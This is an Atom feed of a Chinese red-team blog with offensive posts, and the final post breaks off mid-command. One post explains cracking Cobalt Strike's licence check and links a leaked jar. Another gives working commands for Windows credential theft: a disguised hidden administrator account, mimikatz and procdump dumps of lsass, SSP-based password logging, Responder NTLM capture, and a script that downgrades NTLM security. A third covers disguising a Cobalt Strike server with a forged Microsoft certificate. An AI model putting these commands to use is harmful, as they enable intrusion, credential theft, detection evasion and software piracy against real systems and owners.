<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Blog</title>
  
  <subtitle>written by hosch3n</subtitle>
  <link href="https://hosch3n.github.io/atom.xml" rel="self"/>
  
  <link href="https://hosch3n.github.io/"/>
  <updated>2021-06-13T02:21:52.794Z</updated>
  <id>https://hosch3n.github.io/</id>
  
  <author>
    <name>hosch3n</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CS43伪破解与二次开发</title>
    <link href="https://hosch3n.github.io/2021/05/29/CS43%E4%BC%AA%E7%A0%B4%E8%A7%A3%E4%B8%8E%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/"/>
    <id>https://hosch3n.github.io/2021/05/29/CS43%E4%BC%AA%E7%A0%B4%E8%A7%A3%E4%B8%8E%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/</id>
    <published>2021-05-29T12:57:09.000Z</published>
    <updated>2021-06-13T02:21:52.794Z</updated>
    
    <content type="html"><![CDATA[<p>cobaltstrike.auth是被RSA私钥签名（加密）的授权文件，客户端加载时会利用内置的RSA公钥对其解密，解析获取到试用水印、授权版本、有效期、AES密钥、HMAC等内容。关键的AES密钥和HMAC256用于连接服务器时，解密和校验sleeve中的动态链接库。</p><h2 id="LV0"><a href="#LV0" class="headerlink" title="LV0"></a>LV0</h2><p>破解cobaltstrike 4.x的前提是要么得到了泄漏的auth文件（或里面的关键key），要么得到了解密后的sleeve中的动态链接库。</p><h2 id="LV1"><a href="#LV1" class="headerlink" title="LV1"></a>LV1</h2><p>当得到了<a href="https://www.upload.ee/files/13104600/cobaltstrike.jar.html">原版Jar包</a>、重新签发的<a href="https://hosch3n.github.io/files/cobaltstrike.auth">auth文件</a>和对应的<a href="https://hosch3n.github.io/files/authkey.pub">公钥</a>时，只需替换官方内置的公钥即可。具体操作如下：</p><p>I. 反编译原版Jar包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用IDEA目录中的 plugins/java-decompiler/lib/java-decompiler.jar 反编译源码至ex目录中</span></span><br><span class="line">java -cp ./java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=<span class="literal">true</span> ./cobaltstrike.jar ./ex</span><br></pre></td></tr></table></figure><p>II. 新建项目并将原版Jar包作为依赖加载，配置好Artifacts</p><p><img src="/img/cswpjyek_a.png"></p><p>III. 解压反编译后的jar包，替换resources/authkey.pub，修改common/AuthCrypto中的md5校验为公钥对应的哈希<code>5e5c629ad2673a45b4d3c69984dbdf36</code></p><p>IV. 将beacon/BeaconData中49行的<code>this.shouldPad</code>修改为false，去除exit</p><h2 id="LV2"><a href="#LV2" class="headerlink" title="LV2"></a>LV2</h2><p>基于原版Jar包和关键key，根据逆向的代码逻辑倒推出auth文件内容，自己生成RSA密钥对并签发auth文件。</p><p>由common/Authorization可以看出，auth文件中存放的字节数组依次为4位文件头、2位文件长度、4位有效期、4位水印、1位有效版本、3x(1+16)位未起作用的数据（1位用于标识长度，猜测是官方用于定位原auth文件的购买者身份？）、1位标识关键key长度、关键key。</p><p><img src="/img/cswpjyek_b.png"></p><h2 id="LV3"><a href="#LV3" class="headerlink" title="LV3"></a>LV3</h2><p>利用关键key解密sleeve中的动态链接库，修改common/SleevedResource中的解密逻辑为直接返回原资源。</p><p>修改beacon/BeaconPayload中的抑或key，同时通过机器码特征定位修改dll中的抑或key。废除cloudstrike/WebServer中checksum8上线机制。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://raidforums.com/Thread-Cobalt-Strike-4-3-March-17-2021-bug-fixes?page=4">Cobalt Strike 4.3 (March 17, 2021) [bug fixes]</a></p><p><a href="https://verify.cobaltstrike.com/">官网SHA256哈希校验</a></p><p><a href="https://rcoil.me/2020/11/%E3%80%90%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%E3%80%91Cobalt%20Strike%204.0%E8%AE%A4%E8%AF%81%E5%8F%8A%E4%BF%AE%E8%A1%A5%E8%BF%87%E7%A8%8B/">【知识回顾】Cobalt Strike 4.0 认证及修补过程</a></p><p><a href="https://www.bilibili.com/video/BV1yz411i71Z?p=10">RedCore红队学院CSTips</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;cobaltstrike.auth是被RSA私钥签名（加密）的授权文件，客户端加载时会利用内置的RSA公钥对其解密，解析获取到试用水印、授权版本、有效期、AES密钥、HMAC等内容。关键的AES密钥和HMAC256用于连接服务器时，解密和校验sleeve中的动态链接库。&lt;/</summary>
      
    
    
    
    <category term="基础设施" scheme="https://hosch3n.github.io/categories/%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD/"/>
    
    
    <category term="idea" scheme="https://hosch3n.github.io/tags/idea/"/>
    
    <category term="jar" scheme="https://hosch3n.github.io/tags/jar/"/>
    
    <category term="rsa" scheme="https://hosch3n.github.io/tags/rsa/"/>
    
    <category term="aes" scheme="https://hosch3n.github.io/tags/aes/"/>
    
    <category term="hmac" scheme="https://hosch3n.github.io/tags/hmac/"/>
    
  </entry>
  
  <entry>
    <title>Windows凭据窃取（一）</title>
    <link href="https://hosch3n.github.io/2021/03/10/Windows%E5%87%AD%E6%8D%AE%E7%AA%83%E5%8F%96%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://hosch3n.github.io/2021/03/10/Windows%E5%87%AD%E6%8D%AE%E7%AA%83%E5%8F%96%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2021-03-10T15:48:05.000Z</published>
    <updated>2021-03-13T15:04:12.000Z</updated>
    
    <content type="html"><![CDATA[<p><em>管中窥豹，可见一斑。Windows密钥窃取防护与绕过技术的背后，是红蓝对抗大环境的更新迭代。–hosch3n瞎编的</em> </p><h2 id="Mimikatz非交互执行"><a href="#Mimikatz非交互执行" class="headerlink" title="Mimikatz非交互执行"></a>Mimikatz非交互执行</h2><p>在很久很久以前，通过<code>高卢神器Mimikatz</code>扒Windows的系统密码，就已经是横向移动的标配手段之一。那时候，运维对 AV / EDR / IDS / IPS 还没什么概念，更不用提威胁情报、欺骗防御了。于是只要找个论坛下载原封不动编译好的猕猴桃，远程桌面连上去就能扒下更多的账户密码。</p><p>可能有同学要怼我了，你密码都不知道怎么连远程桌面扒密码？前辈们其实也遇到了这个问题，所以除了RDP密码泄漏这种途径，常常会先添加一个伪装成机器用户的管理员：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">:: 添加用户</span><br><span class="line"><span class="built_in">net</span> user system$ Passw0rd! /add</span><br><span class="line">:: 加入管理员组</span><br><span class="line"><span class="built_in">net</span> localgroup administrators system$ /add</span><br><span class="line">:: 开启远程登录</span><br><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d <span class="number">0</span> /f</span><br><span class="line">:: 查询端口</span><br><span class="line">reg query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber</span><br></pre></td></tr></table></figure><p>又或者通过WebShell非交互式地将输出重定向到文件：</p><p><code>mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords full&quot;&quot; exit &gt;&gt; hash.txt</code></p><p>这引起了某些反病毒软件（AV）的注意，它们将<code>“mimikatz”</code>加入了特征库，也有的会拦截WebShell加系统用户的行为。这时常用的绕过技术有了两条分支，一种是对mimikatz做免杀，另一种是dump存在密钥的lsass进程。</p><h2 id="免杀Mimikatz"><a href="#免杀Mimikatz" class="headerlink" title="免杀Mimikatz"></a>免杀Mimikatz</h2><p>先聊聊对Mimikatz做免杀，反病毒软件两大主要的着力点应该就是对静态特征和动态行为的查杀了，绕过静态特征查杀的基础就是修改特征码。AV厂商（<em>怎么怪怪的</em>）自然会选取正常软件几乎没有，而恶意软件特有的东西作为特征来规避误报。无论是WebShell脚本还是恶意软件的免杀，就是伪装成正常文件逃避检测，因此定个小目标，伪装成<code>SysinternalsSuite</code>的<code>PsExec64.exe</code>。</p><p>浏览一遍源码，感觉可能被用作特征码的字段有这些：</p><p><img src="/img/winkeyqqa_a.png"></p><p>批量将其改为psexec、pslib等，并修复头文件引用。</p><p>项目中的<code>*.rc</code>文件标识着程序元信息：</p><p><img src="/img/winkeyqqa_b.png"></p><p>查看PsExec64.exe的元信息会因为窗口大小被遮挡一部分（无法调整窗口大小），一些括号等特殊符号肉眼也无法区分是半角还是全角、周围有没有空格，手敲模仿不但累还容易敲错。</p><p><img src="/img/winkeyqqa_c.png"></p><p>可以利用<a href="https://github.com/Dijji/FileMeta">FileMeta</a>项目将exe文件元信息设置为可编辑，复制后替换Mimikatz的元信息。</p><p><img src="/img/winkeyqqa_d.png"></p><p>mimilib子项目加载Dll后会生成log记录文件：</p><p><img src="/img/winkeyqqa_e.png"></p><p>通常会将mimilib.dll放在system32路径下，出现log文件显然不正常，同时注意到文件写入均为追加模式，我们将这些<code>*.log</code>文件批量替换为<code>msgsm64.acm</code>用于伪装。</p><p>编译完成后利用<a href="https://github.com/secretsquirrel/SigThief">SigThief</a>项目给生成的exe和dll加上<code>PsExec64.exe</code>的证书，强行偷来的证书校验自然是对不上的，目前某些杀软可能是出于 性能 / 误报 考虑，似乎并未对白签名证书程序进行校验。</p><p><img src="/img/winkeyqqa_f.png"></p><p>也可通过PowerSploit的<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-EncryptedScript.ps1">Out-EncryptedScript</a>脚本，生成加密的<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1">Invoke-Mimikatz</a>绕过AV。</p><ul><li>绕过行为特征查杀目前已有多种内存申请、进程注入、规避敏感接口等等方法，但这不是本文的重点之后有缘再聊。</li></ul><h2 id="进程dump"><a href="#进程dump" class="headerlink" title="进程dump"></a>进程dump</h2><p>静态免杀能过动态行为不一定能过，上面纯属耍小聪明运气好罢了，Mimikatz本身调用了大量WinAPI，改起来有亿点门槛。在网络环境好的情况下，可以dump出lsass进程并将内存dump文件下载回本地读取：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; <span class="keyword">exit</span></span><br></pre></td></tr></table></figure><p>起初可以用各种工具Dump lsass进程，后来一般只有<code>SysinternalsSuite</code>的<code>procdump</code>才不会告警了。</p><ul><li>GUI环境下也可以利用任务管理器等程序</li></ul><h2 id="AddSecurityPackage"><a href="#AddSecurityPackage" class="headerlink" title="AddSecurityPackage"></a>AddSecurityPackage</h2><p>虽然部分杀软对procdump不告警，但在网络环境恶劣的内网还是相当不友好，再如果碰上有卡巴斯基的机器更是直接嗝屁：</p><p><img src="/img/winkeyqqa_g.png"></p><p>至此我们需要了解一个叫SSP（Security Support Provider）的东西，它是SSPI（Security Support Provider Interface）这个Windows认证API的具体dll实现，通过<code>EnumerateSecurityPackages</code>接口可以枚举出已加载的SSP。mimilib.dll就具备SSP的功能，需要在注册表中添加Dll路径并调用<a href="https://docs.microsoft.com/en-us/windows/win32/api/sspi/nf-sspi-addsecuritypackagea">AddSecurityPackage API</a>加载SSP（或者重启）：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v &quot;Security Packages&quot; /t REG_MULTI_SZ /d &quot;pslib64.dll&quot; /f</span><br></pre></td></tr></table></figure><p><img src="/img/winkeyqqa_h.png"></p><ul><li>放在System32目录的pslib64.dll为免杀的mimilib.dll，图中伪装为<code>DPA SSP</code></li></ul><p>发生锁屏登录或是runas等认证行为后，会将明文密码记录在System32下的<code>msgsm64.acm</code>中（默认在kiwissp.log）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[00000000:000003e7] [00000002] WORKGROUP\WIN2019$ (WIN2019$)</span><br><span class="line">[00000000:0000b1bd] [00000002] WORKGROUP\WIN2019$ (UMFD-0)</span><br><span class="line">[00000000:0000b1dd] [00000002] WORKGROUP\WIN2019$ (UMFD-1)</span><br><span class="line">[00000000:000003e4] [00000005] WORKGROUP\WIN2019$ (NETWORK SERVICE)</span><br><span class="line">[00000000:000108e8] [00000002] WORKGROUP\WIN2019$ (DWM-1)</span><br><span class="line">[00000000:00010927] [00000002] WORKGROUP\WIN2019$ (DWM-1)</span><br><span class="line">[00000000:000003e5] [00000005] \ (LOCAL SERVICE)</span><br><span class="line">[00000000:000205d2] [00000002] WIN2019\ryan (ryan)toor</span><br><span class="line">[00000000:0002064b] [00000002] WIN2019\ryan (ryan)toor</span><br></pre></td></tr></table></figure><p>这样做好处就是能扒到明文密码、会进行持久化更新和记录，坏处就是Dll要免杀、有时候也并不一定要持久化或是拿到明文密码才行，并且需要修改注册表、调用<code>AddSecurityPackage API</code>、可被<code>EnumerateSecurityPackages API</code>枚举查看、还要等一个有缘人触发登录行为。</p><p>很多时候会有点得不偿失，于是XPN在对<code>Mimikatz</code>和<code>Secur32.dll</code>跟进深入分析后，发现了以下几个要点：</p><ol><li><p>WDigest会调用SpAcceptCredentials缓存凭据</p></li><li><p>Mimilib在明文凭据传入调用后将其保存到文件里</p></li><li><p>MemSSP搜索lsass进程中的<code>msv1_0.dll</code>，通过<code>WriteProcessMemory</code> Hook <code>SpAcceptCredentials</code></p></li><li><p><code>AddSecurityPackage API</code>会通过<code>SspirCallRpc</code>调用<code>lsass</code>，通知<code>lsass</code>加载SSP</p></li></ol><p>在<a href="https://gist.github.com/xpn/c7f6d15bf15750eae3ec349e7ec2380e">Github Gist</a>有不使用<code>AddSecurityPackage API</code>加载Dll的代码，咱们对其稍作修改：</p><ol><li><p>引入静态链接库<code>#pragma comment(lib, &quot;Rpcrt4.lib&quot;)</code></p></li><li><p>修改工程字符集为<code>Use Multi-Byte Character Set</code></p></li></ol><p><img src="/img/winkeyqqa_i.png"></p><ol start="3"><li>为了用起来方便，将原本的绝对路径加载Dll改为相对相对路径加载（可以用判断目录等方式实现兼容绝对路径和相对路径，但懒得搞感觉不是很必要）</li></ol><p><img src="/img/winkeyqqa_j.png"></p><ol start="4"><li>最后整一个查找lsass进程并Dump内存的Dll：</li></ol><p><img src="/img/winkeyqqa_l.png"></p><ol start="5"><li>利用RPC调用lsass加载Dll并Dump自身内存：</li></ol><p><img src="/img/winkeyqqa_m.png"></p><p>好处是无需修改注册表、枚举SSP查不到，坏处是网络环境恶劣时不方便将Dump文件下载回来，所以也可以考虑用XPN公布的<a href="https://gist.github.com/xpn/93f2b75bf086baf2c388b2ddd50fb5d0">memssp版Dll</a>。</p><h2 id="Net-NTLMv1"><a href="#Net-NTLMv1" class="headerlink" title="Net-NTLMv1"></a>Net-NTLMv1</h2><p>为了缓解内存中WDigest的明文密码泄漏，微软发布了KB2871997（当然这个补丁作用不止于此），会在登录后将明文缓存清除掉，并且限制本地Administrator（RID 500）和本地管理员组的域用户之外的用户进行PTH（比如本地管理员组的其它用户不行）。</p><p>PassTheHash（PTH）通常是指利用NTLM哈希完成Windows身份认证这一类行为，具体可通过<code>mimikatz</code>、<code>psexec</code>、<code>smbexec</code>、<code>atexec</code>、<code>wmiexec</code>、<code>dcomexec</code>、<code>WinRM</code>等等实现。但我们不妨思考一下，为什么可以不需要明文密码？</p><p>Web应用通常是服务端收到HTTP/S传输来的明文密码（当然也有会前端加密的），在<strong>服务端</strong>对明文密码哈希计算并与数据库中存储的密码哈希比对，所以得到密码哈希后，需要由彩虹表查出明文密码才能登录。但NTLM身份认证是由<strong>客户端</strong>将用户输入的明文密码转化为NTLM哈希并加密为Net-NTLM后再由SMB、HTTP等协议传输，这就是为什么很多时候并不需要明文密码。</p><p>LM哈希（LAN Manager Hash）是NT5系列操作系统的密码默认加密方式，将明文规则变换后进行DES加密。实现方式使其可加密的最大长度为14、无法区分大小写、密文强度不高。</p><p><img src="/img/winkeyqqa_n.png"></p><p>随后微软设计了基于challenge/response机制的NTLM（NT LAN Manage)身份验证协议，从NT6操作系统开始将NTLM Hash作为密码默认加密方式。</p><p><img src="/img/winkeyqqa_o.png"></p><ol><li><p>在进行身份认证的过程中，客户端会以NTLM哈希作为密钥，通过3DES（NTLMv1）/ HMAC-MD5（NTLMv2）算法加密服务端发来的challenge，进行规则变换后最终得到net-ntlm哈希。</p></li><li><p>服务端取出密码库里存的NTLM哈希，以同样的算法加密challenge，比对客户端发来的net-ntlm哈希判断密码是否正确。</p></li><li><p>如果是域环境则密码库可能不在同一个服务端（在域控上），此时服务端会由Pass Through Authentication机制，通过netlogon协议向域控转发客户端信息。</p></li></ol><p><img src="/img/winkeyqqa_p.png"></p><p>其中NTLMv1根据有无<code>Client Challenge</code>参与，可分为第一种Net-NTLMv1哈希和另一种Net-NTLMv1-SSP哈希。而第一种Net-NTLMv1哈希因实现方式的问题，导致可以设置一个固定的<code>Sever Challenge</code>（1122334455667788）建立<a href="https://github.com/lgandx/Responder">Rogue Server</a>，在目标系统向我们建立的恶意服务器发起SMB请求（最简单的就是访问一个UNC路径<code>\\1.1.1.1</code>），通过<a href="https://crack.sh/get-cracking/">彩虹表</a>可查到解密后的NTLM哈希。</p><p><code>sudo ./Responder.py -I wlp2s0 -wrfv --lm</code></p><p><img src="/img/winkeyqqa_q.png"></p><p>这样就可不对Lsass进程毛手毛脚就获取到NTLM哈希，当然也可以尝试更进一步通过彩虹表查出NTLM哈希对应的明文密码。</p><p><img src="/img/winkeyqqa_k.png"></p><p>不过实际利用中可能会出现这种情况：</p><p><img src="/img/winkeyqqa_r.png"></p><p>这是因为<a href="https://docs.microsoft.com/en-us/windows-server/storage/file-server/troubleshoot/smbv1-not-installed-by-default-in-windows">高版本</a>的Windows服务器上可能不存在SMBv1客户端，其次LMCompatibilityLevel的值也会有影响。可以利用PowerShell修改注册表并安装SMBv1客户端，<strong>注意会导致系统重启！</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Set-Relay</span></span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment"># LMCompatibilityLevel</span></span><br><span class="line">reg add <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa\&quot;</span> /v lmcompatibilitylevel /t REG_DWORD /d <span class="number">2</span> /f</span><br><span class="line"><span class="comment"># NTLMMinClientSec</span></span><br><span class="line">reg add <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0\&quot;</span> /v NtlmMinClientSec /t REG_DWORD /d <span class="number">536870912</span> /f</span><br><span class="line"><span class="comment"># RestrictSendingNTLMTraffic</span></span><br><span class="line">reg add <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0\&quot;</span> /v RestrictSendingNTLMTraffic /t REG_DWORD /d <span class="number">0</span> /f</span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable SMBv1</span></span><br><span class="line"><span class="built_in">Enable-WindowsOptionalFeature</span> <span class="literal">-Online</span> <span class="literal">-FeatureName</span> smb1protocol</span><br><span class="line"><span class="comment"># DisableLoopbackCheck</span></span><br><span class="line">reg add <span class="string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\&quot;</span> /v LsaDisableLoopbackCheck /t REG_DWORD /d <span class="number">1</span> /f</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Set-Relay</span></span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.xpnsec.com/exploring-mimikatz-part-2/">Exploring Mimikatz - Part 2 - SSP</a></p><p><a href="https://3gstudent.github.io/3gstudent.github.io/Mimikatz%E4%B8%ADSSP%E7%9A%84%E4%BD%BF%E7%94%A8/">Mimikatz中SSP的使用</a></p><p><a href="https://blog.ateam.qianxin.com/post/zhe-shi-yi-pian-bu-yi-yang-de-zhen-shi-shen-tou-ce-shi-an-li-fen-xi-wen-zhang/#44-%E5%8D%A1%E5%B7%B4%E6%96%AF%E5%9F%BA%E7%9A%84%E5%AF%B9%E6%8A%97">这是一篇“不一样”的真实渗透测试案例分析文章</a></p><p><a href="https://mp.weixin.qq.com/s/K-gA9UOyjT7y51ZqmHGnNw">dump lass 工具</a></p><p><a href="https://www.mrwu.red/web/2000.html">通过Windows蓝屏文件来绕过kaspersky的内存保护抓密码</a></p><p><a href="https://www.sans.org/blog/protecting-privileged-domain-accounts-network-authentication-in-depth/">Protecting Privileged Domain Accounts: Network Authentication In-Depth</a></p><p><a href="https://daiker.gitbook.io/windows-protocol/ntlm-pian/6#1-netntlm-v1-de-po-jie">Net-NTLM v1 的破解</a></p><p><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level">Network security: LAN Manager authentication level</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;em&gt;管中窥豹，可见一斑。Windows密钥窃取防护与绕过技术的背后，是红蓝对抗大环境的更新迭代。–hosch3n瞎编的&lt;/em&gt; &lt;/p&gt;
&lt;h2 id=&quot;Mimikatz非交互执行&quot;&gt;&lt;a href=&quot;#Mimikatz非交互执行&quot; class=&quot;headerlink</summary>
      
    
    
    
    <category term="红蓝对抗" scheme="https://hosch3n.github.io/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
    
    <category term="mimikatz" scheme="https://hosch3n.github.io/tags/mimikatz/"/>
    
    <category term="mimilib" scheme="https://hosch3n.github.io/tags/mimilib/"/>
    
    <category term="ssp" scheme="https://hosch3n.github.io/tags/ssp/"/>
    
    <category term="ntlm" scheme="https://hosch3n.github.io/tags/ntlm/"/>
    
  </entry>
  
  <entry>
    <title>Windows权限维持</title>
    <link href="https://hosch3n.github.io/2021/01/11/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    <id>https://hosch3n.github.io/2021/01/11/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</id>
    <published>2021-01-11T06:28:29.000Z</published>
    <updated>2021-03-09T09:56:38.000Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="04cf9c152e89284c9c1c52203553e6284875727844ff7a51f0ac442a4fecf7fe"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="红蓝对抗" scheme="https://hosch3n.github.io/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
    
    <category term="startup" scheme="https://hosch3n.github.io/tags/startup/"/>
    
    <category term="reg" scheme="https://hosch3n.github.io/tags/reg/"/>
    
    <category term="service" scheme="https://hosch3n.github.io/tags/service/"/>
    
    <category term="bitsadmin" scheme="https://hosch3n.github.io/tags/bitsadmin/"/>
    
    <category term="MCT" scheme="https://hosch3n.github.io/tags/MCT/"/>
    
    <category term="wmi" scheme="https://hosch3n.github.io/tags/wmi/"/>
    
    <category term="IFEO" scheme="https://hosch3n.github.io/tags/IFEO/"/>
    
    <category term="gflags" scheme="https://hosch3n.github.io/tags/gflags/"/>
    
    <category term="system$" scheme="https://hosch3n.github.io/tags/system/"/>
    
  </entry>
  
  <entry>
    <title>Java反射与类加载</title>
    <link href="https://hosch3n.github.io/2021/01/10/Java%E5%8F%8D%E5%B0%84%E4%B8%8E%E7%B1%BB%E5%8A%A0%E8%BD%BD/"/>
    <id>https://hosch3n.github.io/2021/01/10/Java%E5%8F%8D%E5%B0%84%E4%B8%8E%E7%B1%BB%E5%8A%A0%E8%BD%BD/</id>
    <published>2021-01-10T08:01:21.000Z</published>
    <updated>2021-04-07T08:48:41.439Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="133c7d05f2ec92261ea5c2925bc5beee00ea3d7bf3ad8aa734f00ca4e8d141b0"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="reflection" scheme="https://hosch3n.github.io/tags/reflection/"/>
    
    <category term="classloader" scheme="https://hosch3n.github.io/tags/classloader/"/>
    
  </entry>
  
  <entry>
    <title>检测与隐藏Cobaltstrike服务器</title>
    <link href="https://hosch3n.github.io/2020/12/16/%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%9A%90%E8%97%8FCobaltstrike%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>https://hosch3n.github.io/2020/12/16/%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%9A%90%E8%97%8FCobaltstrike%E6%9C%8D%E5%8A%A1%E5%99%A8/</id>
    <published>2020-12-16T01:38:12.000Z</published>
    <updated>2021-03-22T05:50:59.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文是对CS服务器检测与隐藏方法的学习总结，介绍检测方法的同时浅析相应隐藏方法的原理，并动手一步一步的修改相应特征值，搭建出一个不易被标记的基础服务器。</p><h2 id="默认端口"><a href="#默认端口" class="headerlink" title="默认端口"></a>默认端口</h2><p>CS服务器默认监听在50050端口，可以在启动前编辑<code>teamserver</code>文件更改监听端口：</p><p><code>sed -i &#39;s/50050/10080/g&#39; teamserver</code></p><ul><li>至于能不能有一点卵用就见仁见智了，只能说类似于将Tomcat从8080改到9090</li></ul><h2 id="默认证书"><a href="#默认证书" class="headerlink" title="默认证书"></a>默认证书</h2><p>接着进行全端口扫描，看到默认证书中存在CS证书签发者的相关信息，我们可以用keytool重签一个伪造的证书。</p><p><img src="/img/jcyyccss_a.png"></p><p><code>keytool</code>是一个装好JDK就会有的Java证书管理工具，输入命令<code>keytool -list -v -keystore cobaltstrike.store -storepass 123456</code>详细列出证书各条目信息。</p><p><img src="/img/jcyyccss_b.png"></p><p>然后删除默认的并重签一个伪造证书，重启CS后再用<code>nmap -p- -A -vv</code>扫描时已经消除该特征。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm ./cobaltstrike.store</span><br><span class="line">sed -i <span class="string">&#x27;s!-alias cobaltstrike -dname &quot;CN=Major Cobalt Strike, OU=AdvancedPenTesting, O=cobaltstrike, L=Somewhere, S=Cyberspace, C=Earth&quot;!-alias microsoft.com -dname &quot;CN=Microsoft Windows, OU=MOPR, O=Microsoft Corporation, L=Redmond, ST=Washington, C=US&quot;!g&#x27;</span> teamserver</span><br></pre></td></tr></table></figure><p><img src="/img/jcyyccss_c.png"></p><h2 id="HTTPS证书"><a href="#HTTPS证书" class="headerlink" title="HTTPS证书"></a>HTTPS证书</h2><p>改了远控服务端证书后，抓包可以发现通过HTTPS的Beacon上线机器用的证书并不是同一个，而且同样存在可被识别的固定特征。</p><p><img src="/img/jcyyccss_w.png"></p><p><img src="/img/jcyyccss_x.png"></p><p>可以向<code>Let&#39;s Encrypt</code>申请一个免费证书并打包为keystore，用来替换CS自带的https证书。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 申请免费证书</span></span><br><span class="line">apt install certbot</span><br><span class="line">certbot certonly --standalone -d 